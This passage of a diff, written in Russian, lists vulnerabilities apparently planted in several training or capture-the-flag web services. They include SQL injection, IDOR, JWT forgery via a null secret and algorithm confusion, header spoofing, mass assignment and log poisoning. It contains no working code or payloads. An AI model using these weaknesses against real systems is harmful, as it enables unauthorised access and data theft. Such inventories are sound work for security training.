+   - Подмена `X-Forwarded-For` для доступа к внутренним отчётам.
+
+2. **DNK_web**
+   - SQL Injection в фильтрации операций.
+   - IDOR при получении GPS-данных рейсов.
+
+3. **SMP**
+   - Wildcard `%` в `LIKE` позволяет получить чужие сообщения.
+   - Предсказуемый нулевой JWT-secret позволяет подделывать токены.
+
+4. **DNK BlackLine**
+   - JWT alg-confusion + утечка Bearer-токенов через логи.
+   - Fleet mass assignment и чтение чужих `secret_token`.
+   - Finance error-based leakage через `orderBy`.
+   - Публичные логи / log poisoning / небезопасная выдача логов.
+   - Retail IDOR и утечка `role_retail_flag`.
